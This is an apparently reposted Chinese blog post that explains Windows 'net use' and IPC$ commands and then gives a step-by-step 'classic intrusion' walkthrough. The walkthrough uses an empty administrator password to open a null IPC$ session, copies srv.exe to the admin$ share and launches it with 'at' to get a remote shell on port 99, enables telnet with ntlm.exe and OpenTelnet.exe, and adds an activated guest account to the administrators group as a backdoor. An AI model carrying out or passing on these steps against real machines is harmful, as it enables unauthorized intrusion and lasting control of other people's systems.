# 			 [     net use命令详解（转）        ](https://www.cnblogs.com/mamiyiya777/p/11017875.html) 		

 

 

[net use命令详解](https://www.cnblogs.com/mamiyiya777/p/11017875.html)

1)建立空连接: 
net use \\IP\ipc$ "" /user:"" (一定要注意:这一行命令中包含了3个空格) 

2)建立非空连接: 
net use \\IP\ipc$ "密码" /user:"用户名" (同样有3个空格) 

3)映射默认共享: 
net use z: \\IP\c$ "密码" /user:"用户名" (即可将对方的c盘映射为自己的z盘，其他盘类推) 
如果已经和目标建立了ipc$，则可以直接用IP+盘符+$访问,具体命令 net use z: \\IP\c$ 

4)删除一个ipc$连接 
net use \\IP\ipc$ /del 

5)删除共享映射 
net use c: /del 删除映射的c盘，其他盘类推 
net use * /del 删除全部,会有提示要求按y确认 

3 查看远程主机的共享资源（但看不到默认共享） 
net view \\IP 

4 查看本地主机的共享资源（可以看到本地的默认共享） 
net share 

5 得到远程主机的用户名列表 
nbtstat -A IP 

6 得到本地主机的用户列表 
net user 

7 查看远程主机的当前时间 
net time \\IP 

8 显示本地主机当前服务 
net start 

9 启动/关闭本地服务 
net start 服务名 /y 
net stop 服务名 /y 

10 映射远程共享: 
net use z: \\IP\baby 
此命令将共享名为baby的共享资源映射到z盘 

11 删除共享映射 
net use c: /del 删除映射的c盘，其他盘类推 
net use * /del /y删除全部 

12 向远程主机复制文件 
copy \路径\srv.exe \\IP\共享目录名，如： 
copy ccbirds.exe \\*.*.*.*\c 即将当前目录下的文件复制到对方c盘内 

13 远程添加计划任务 
at \\ip 时间 程序名，如： 
at \\127.0.0.0 11:00 love.exe 
注意：时间尽量使用24小时制；在系统默认搜索路径（比如system32/）下不用加路径，否则必须加全路径 
14 开启远程主机的telnet 
这里要用到一个小程序：opentelnet.exe，各大下载站点都有，而且还需要满足四个要求： 

1）目标开启了ipc$共享 
2）你要拥有管理员密码和帐号 
3）目标开启RemoteRegistry服务，用户就该ntlm认证 
4）对WIN2K/XP有效，NT未经测试 
命令格式：OpenTelnet.exe \\server account psw NTLM认证方式 port 
试例如下：c:\>OpenTelnet.exe \\*.*.*.* administrator "" 1 90 

15 激活用户/加入管理员组 
1 net uesr account /active:yes 
2 net localgroup administrators account /add 

16 关闭远程主机的telnet 
同样需要一个小程序：ResumeTelnet.exe 
命令格式：ResumeTelnet.exe \\server account psw 
试例如下：c:\>ResumeTelnet.exe \\*.*.*.* administrator "" 

17 删除一个已建立的ipc$连接 
net use \\IP\ipc$ /del 

九 经典入侵模式 
这个入侵模式太经典了,大部分ipc教程都有介绍,我也就拿过来引用了,在此感谢原创作者!(不知道是哪位前辈) 

\1. C:\>net use \\127.0.0.1\IPC$ "" /user:"admintitrators" 
这是用《流光》扫到的用户名是administrators，密码为"空"的IP地址(空口令?哇,运气好到家了)，如果是打算攻击的话，就可以用这样的命令来与127.0.0.1建立一个连接，因为密码为"空"，所以第一个引号处就不用输入，后面一个双引号里的是用户名，输入administrators，命令即可成功完成。 
复制之前务必用net view \\IP这个命令看一下对方的共享情况 
\2. C:\>copy srv.exe \\127.0.0.1\admin$ 
先复制srv.exe上去，在流光的Tools目录下就有（这里的$是指admin用户的c:\winnt\system32\，大家还可以使用c$、d$，意思是C盘与D盘，这看你要复制到什么地方去了）。 

\3. C:\>net time \\127.0.0.1 
查查时间，发现127.0.0.1 的当前时间是 2002/3/19 上午 11:00，命令成功完成。 

\4. C:\>at \\127.0.0.1 11:05 srv.exe 
用at命令启动srv.exe吧（这里设置的时间要比主机时间快，不然你怎么启动啊，呵呵！） 

\5. C:\>net time \\127.0.0.1 
再查查到时间没有？如果127.0.0.1 的当前时间是 2002/3/19 上午 11:05，那就准备开始下面的命令。 

\6. C:\>telnet 127.0.0.1 99 
这里会用到Telnet命令吧，注意端口是99。Telnet默认的是23端口，但是我们使用的是SRV在对方计算机中为我们建立一个99端口的Shell。 
虽然我们可以Telnet上去了，但是SRV是一次性的，下次登录还要再激活！所以我们打算建立一个Telnet服务！这就要用到ntlm了 

7.C:\>copy ntlm.exe \\127.0.0.1\admin$ 
用Copy命令把ntlm.exe上传到主机上（ntlm.exe也是在《流光》的Tools目录中）。 

\8. C:\WINNT\system32>ntlm 
输入ntlm启动（这里的C:\WINNT\system32>指的是对方计算机，运行ntlm其实是让这个程序在对方计算机上运行）。当出现"DONE"的时候，就说明已经启动正常。然后使用"net start telnet"来开启Telnet服务！ 

\9. Telnet 127.0.0.1，接着输入用户名与密码就进入对方了，操作就像在DOS上操作一样简单！(然后你想做什么?想做什么就做什么吧,哈哈) 

为了以防万一,我们再把guest激活加到管理组 
\10. C:\>net user guest /active:yes 
将对方的Guest用户激活 

\11. C:\>net user guest 1234 
将Guest的密码改为1234,或者你要设定的密码 

\12. C:\>net localgroup administrators guest /add 
将Guest变为Administrator^_^(如果管理员密码更改，guest帐号没改变的话，下次我们可以用guest再次访问这台计算机) 

另外,你也可以根据返回的错误号分析原因： 

错误号5，拒绝访问：很可能你使用的用户不是管理员权限的，先提升权限； 
错误号51，Windows无法找到网络路径：网络有问题； 
错误号53，找不到网络路径：ip地址错误；目标未开机；目标lanmanserver服务未启动；目标有防火墙（端口过滤）； 
错误号67，找不到网络名：你的lanmanworkstation服务未启动或者目标删除了ipc$； 
错误号1219，提供的凭据与已存在的凭据集冲突：你已经和对方建立了一个ipc$，请删除再连； 
错误号1326，未知的用户名或错误密码：原因很明显了； 
错误号1792，试图登录，但是网络登录服务没有启动：目标NetLogon服务未启动； 
错误号2242，此用户的密码已经过期：目标有帐号策略，强制定期要求更改密码

 

   在使用这种方法屏蔽网络映射功能时，只需要先打开系统的运行对话框，并在其中执行“cmd”字符串命令，将系统界面切换到MS-DOS命令行状态；接着在DOS提示符下执行“net use  x：/del”字符串命令，就能将网络磁盘分区为“X”的网络映射连接断开了，要想快速地将本地计算机中所有的网络映射连接断开的话，只需要执行“net use * /del”字符串命令就可以了。

​    分类:             [IPC](https://www.cnblogs.com/mamiyiya777/category/1481798.html)